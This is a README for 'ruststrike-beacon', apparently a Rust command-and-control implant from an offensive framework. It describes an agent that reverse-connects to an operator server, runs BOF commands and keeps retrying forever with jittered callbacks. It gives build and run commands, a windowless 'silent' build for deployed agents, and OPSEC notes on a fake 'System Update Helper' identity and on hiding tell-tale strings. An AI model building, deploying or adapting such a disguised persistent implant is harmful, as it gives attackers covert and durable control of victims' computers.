# ruststrike-beacon

A **beacon-style** implant. It is a sibling of `crates/implant` (same wire
protocol, same in-process BOF loader, same OPSEC cover identity) with one
crucial difference: **it never gives up on the server.**

## Behavior

- Reverse-connects to the server (the operator's core) over the same
  newline-JSON protocol as the stock implant.
- On each connect it sends a proactive `hello` so the core registers the
  session immediately.
- Pumps commands (`hello`, `bof`) until the server closes the stream.
- When the stream ends **or the dial fails**, it sleeps a configurable
  **callback interval** (± jitter) and checks in again — forever. Restart the
  server, take it down for an hour, change its IP — the beacon keeps retrying
  and will reappear as soon as the server is reachable.
- Relay/pivot is declined (`relay_error`): a beacon's link is intermittent, so a
  long-lived pivot listener on it isn't meaningful. Use the stock
  `ruststrike-implant` for pivoting.

This is the classic C2 beacon model: the agent calls home on a cadence the
operator controls, rather than holding a persistent channel that dies with the
server.

## Config

Precedence (first wins per field): CLI flag → positional → env → appended
trailer → defaults.

```
ruststrike-beacon <host> [port] [interval_secs] [options]
  --host H          callback host
  --port P          callback port
  --interval S      seconds between check-ins (default 5)
  --jitter PCT      ±percent jitter, 0..50 (default 0)
```

Environment:

```
BEACON_HOST=10.0.0.5
BEACON_PORT=4444
BEACON_INTERVAL=30
BEACON_JITTER=20
```

The **appended-config trailer** uses the same opaque magic as the stock implant
(`host\0port\0` near the end of the exe), so the existing stub builder
(`tools/stubbuilder`, `POST /api/stub/build`) can patch a beacon exe and have it
check in with no args. The trailer only carries host:port; interval/jitter come
from env or defaults on the beacon side.

Defaults: `127.0.0.1:4444`, interval `5s`, jitter `0%`.

## Build

```sh
cargo build --release -p ruststrike-beacon
# dev logs:
cargo build --release -p ruststrike-beacon --features verbose
```

Two bin targets, same lib:

- `ruststrike-beacon`        — console subsystem (dev; shows `[beacon]` logs
  with `--features verbose`).
- `ruststrike-beacon-silent` — GUI subsystem (`#![windows_subsystem = "windows"]`);
  no console window. Use this for operator-deployed agents.

## Test

```sh
cargo test --release -p ruststrike-beacon
```

The `reconnects_after_server_close` test drives two full check-in cycles
against a local listener that closes after each hello — proving the beacon
reconnects after the server drops it. `check_in_fails_cleanly_when_server_down`
proves a down server yields an error (not a panic) so `run()` keeps retrying.

## Running end-to-end

```sh
# 1. core (implant TCP :4444, operator HTTP/WS :8091)
RUSTSTRIKE_BOFS=./clients/server/bofs ./clients/server/server.exe 4444 8091
# 2. beacon — checks in every 5s; kill & restart the core, it comes back
./target/release/ruststrike-beacon.exe 127.0.0.1 4444 5
# slower, jittered callback:
./target/release/ruststrike-beacon.exe 127.0.0.1 4444 --interval 30 --jitter 20
```

## OPSEC notes

- Same cover identity ("System Update Helper") + manifest + version resource as
  the stock implant, embedded via `build.rs` (winres).
- Debug logs compile out unless `--features verbose`.
- The word "beacon" appears in the proactive `hello` data and the relay-error
  string — these go over the wire, not into the binary's static strings (they're
  built at runtime). Add a `--remap-path-prefix=crates\beacon=app` entry to
  `.cargo/config.toml` (see the workspace config) so panic Locations don't leak
  the crate name.
